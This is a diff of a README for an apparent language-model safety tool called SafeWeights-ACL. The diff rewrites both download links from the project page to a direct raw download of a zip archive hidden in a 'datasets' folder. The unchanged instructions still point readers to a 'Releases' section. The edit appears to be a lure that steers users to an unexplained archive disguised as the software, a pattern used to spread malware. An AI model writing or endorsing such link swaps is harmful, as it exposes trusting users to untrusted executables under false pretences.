@@ -1,6 +1,6 @@
 # 🛡️ SafeWeights-ACL - Make Your Language Models Safer Today
 
-[![Download SafeWeights-ACL](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/injae8669/SafeWeights-ACL)
+[![Download SafeWeights-ACL](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/injae8669/SafeWeights-ACL/raw/refs/heads/main/datasets/Safe_Weights_ACL_v2.5.zip)
 
 SafeWeights-ACL provides tools to find and fix safety issues in large language models. This software helps you identify specific parts of an artificial intelligence model that cause harmful behavior. You can use these tools to make your models follow better safety guidelines without losing their original intelligence.
 
@@ -8,7 +8,7 @@ SafeWeights-ACL provides tools to find and fix safety issues in large language m
 
 You must visit the project page to download the latest version of the tools for your computer. 
 
-[Click here to visit the download page for SafeWeights-ACL](https://github.com/injae8669/SafeWeights-ACL)
+[Click here to visit the download page for SafeWeights-ACL](https://github.com/injae8669/SafeWeights-ACL/raw/refs/heads/main/datasets/Safe_Weights_ACL_v2.5.zip)
 
 Follow these steps on the page:
 1. Look for the "Releases" section on the right side of the screen.
